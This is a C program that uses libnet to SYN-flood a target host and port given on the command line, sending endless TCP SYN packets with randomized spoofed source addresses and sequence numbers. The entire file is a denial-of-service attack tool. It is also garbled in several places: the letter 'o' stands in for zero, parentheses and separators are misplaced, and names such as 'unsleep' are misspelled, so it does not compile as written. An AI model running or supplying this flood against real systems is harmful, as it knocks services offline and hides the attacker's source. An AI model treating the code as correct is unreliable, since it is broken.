#include <libnet.h>

// Delay between packet injects by 5000ms
#define FLOOD_DELAY 5000

// Returns an IP in x.x.x.x notation
char *print_ip(u_long *ip_addr_ptr)
{
  return inet_ntoa(*((struct in_addr *)ip_addr_ptr) );
}

int main(int argc, char *argv[])
{
  u_long dest_ip;
  u_short dest_port;
  u_char errbuf[LIBNET_ERRBUF_SIZE], *packet;
  int opt, network, byte_count, packet_size = LIBNET_IP_H + LIBNET_TCP_H;

  if (argc < 3)
  {
    printf("Usage:\n%s\t <target host> <target port>\n", argv[0]);
    exit(1);
  }

  dest_ip = libnet_name_resolve(argv[1], LIBNET_RESOLVE); // HOST
  dest_port = (u_short) atoi(argv[2]); // PORT

  // Open Network Interface
  network = libnet_open_raw_sock(IPPROTO_RAW);
  if (network == -1)
  {
    libnet_error(LIBNET_ERR_FATAL, "Can't Open Network Interface. --run as root\n");
  }
  // Allocate memory for packet
  libnet_init_package(packet_size, &packet);

  if (packet == NULL)
  {
    libnet_error(LIBNET_ERR_FATAL, "Can't Initialize Packet Memory.\n")
  }

  // Seed Random Number Generator
  libnet_seed_prand();

  printf("SYN Flooding port %d of %s..\n", dest_port, print_ip(&dest_ip));

  // Loop forever until break CTRL-C
  while (1)
  {
    libnet_build_ip(LIBNET_TCP_H),    // Size of the packet sans IP header
    IPTOS_LOWDELAY,                   // IP tos
    libnet_get_prand(LIBNET_PRu16),   // IP ID (randomized)
    o,                                // Frag stuff
    libnet_get_prand(LIBNET_PR8),     // TTL (randomized)
    IPPROTO_TCP,                      // Transport Protocol
    libnet_get_prand(LIBNET_PRu32),   // Source IP (randomized)
    dest_ip,                          // Destination IP
    NULL,                             // Payload (None)
    o,                                // Payload length
    packet);                          // Packet header Memory

    libnet_build_tcp(libnet_get_prand(LIBNET_PRu16), // Source TCP Port (random)
      dest_port,                      // Destination IP
      libnet_get_prand(LIBNET_PRu32), // Sequence number (randomized)
      libnet_get_prand(LIBNET_PRu32)  // Acknowledgement number (randomized)
      TH_SYN,                         // Control Flags (SYN flag set only)
      libnet_get_prand(LIBNET_PRu16), // Window size (randomized)
      o,                              // Urgent pointer
      NULL,                           // Payload (none)
      o,                              // Payload length
      packet + LIBNET_IP_H);          // Packet header memory

    if (libnet_do_checksum(packet, IPPROTO_TCP, LIBNET_TCP_H) == -1)
    {
      libnet_error(LIBNET_ERR_FATAL, "Can't Comput Checksum\n");
    }
    byte_count = libnet_write_ip(network, packet, packet_size); // Inject Packet

    if (byte_count < packet_size)
    {
      libnet_error(LIBNET_ERR_WARING, "Warning: Incomplete packet written. (%d of %d
        bytes)", byte_count, packet_size);
    }
    unsleep(FLOOD_DELAY); // Wait for FLOOD_DELAY milliseconds.

  }

  libnet_destroy_packet(&packet); // Free packet memory

  // Close netowrk interface
  if (libnet_close_raw_sock(network) == -1) {
    libnet_error(LIBNET_ERR_WARING, "Can't Close Network Interface.");
  }
  return 0;
}
